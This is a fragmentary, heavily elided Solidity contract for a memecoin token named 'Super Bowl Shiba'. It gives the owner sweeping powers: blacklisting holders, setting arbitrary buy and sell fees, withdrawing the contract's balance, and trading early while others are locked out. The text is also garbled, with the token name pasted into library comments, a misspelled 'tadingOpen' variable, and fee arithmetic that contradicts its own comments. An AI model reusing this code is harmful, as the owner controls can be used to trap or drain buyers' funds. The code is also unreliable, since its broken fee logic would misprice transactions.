...
pragma solidity ^0.8.4;
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also SuperBowlShibaed.
...
abstract contract Context {
	 ...
	 * This allows applications to reconstruct the allowance for all SuperBowlShiba just
	...
	// File: contracts/SuperBowlShiba.sol

	// 

	pragma solidity ^0.8.0;

	contract SuperBowlShiba is ERC20, Ownable {
		using SafeMath for uint256;
		...
		address payable public BP = payable(0x0000000000000000000000000000000000000000); 
		...
		uint256 public _maxWalletToken= 20000000 * (10**18); 
		...
		uint256 private _swapTokenAtAmount = 200000 * (10**18);
		uint256 public _swapThreshold = 1000000000 * (10**18); 
		...
		event excludeMultipleAccountFromRewards(address[] SuperBowlShiba, bool isExcluded);
		...
		constructor() ERC20("Super Bowl Shiba", "SBSHIB"){
			...
			emit SetIsFeeExempt(address(0x7FDE57d865f31eb0970e839b895a8F17052DE7a4), true);

			// enable owner and fixed-sale wallet to send tokens before presales are over
			canTransferBeforetadingOpen[owner()] = true;
			canTransferBeforetadingOpen[0x7FDE57d865f31eb0970e839b895a8F17052DE7a4] = true;
		...
		function excludeFromFees(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "SuperBowlShiba: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;
		}
        
        function excludeFromTxLimit(address account, bool excluded) public onlyOwner {
			require(_isTxLimit[account] != excluded, "SuperBowlShiba: Account is already the value of 'excluded'");
			_isTxLimit[account] = excluded;

		
		}
		  function excludeFromBlacklist(address account, bool excluded) public onlyOwner {
			require(_isBlacklisted[account] != excluded, "SuperBowlShiba: Account is already the value of 'excluded'");
		...
		function setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
			require(pair != pancakeswapV2Pair, "SuperBowlShiba: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "SuperBowlShiba: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "SuperBowlShiba: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) public onlyOwner {
			require(gas >= 200000 && gas <= 500000, "SuperBowlShiba: distributorGas must be between 200,000 and 500,000");
			require(gas != distributorGas, "SuperBowlShiba: Cannot update distributorGas to same value");
		...
		function setBuyFees(uint256 _buyLiquidityFee, uint256 _buyMarketingFee, uint256 _buyBuybackFee, uint256 _feeDenominator) public onlyOwner {
			...
			function setSellFees(uint256 _sellLiquidityFee, uint256 _sellMarketingFee, uint256 _sellBuybackFee, uint256 _feeDenominator) public onlyOwner {
		...
		function setFeeReceivers(address _MarketingFeeReceiver, address _BuybackFeeReceiver )  public onlyOwner {
        ...
        function clearStuckBalance_sender(uint256 amount) external onlyOwner {
			_clearStuckBalance(msg.sender, amount);

        }
    
	
        function _clearStuckBalance(address account, uint256 amount) internal virtual {
		...
		function _transfer(
			...
			if(!tradingOpen) {
				require(canTransferBeforetadingOpen[from], "SuperBowlShiba: This account cannot send tokens until trading is enabled");
			}
			...
			if(
				...
				uint256 swapTokens = contractTokenBalance.mul(buyLiquidityFee).div(buyMarketingFee);
			...
			if(takeFee) {
				uint256 fees = amount.mul(buyMarketingFee).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(buyMarketingFee).div(100);
				}
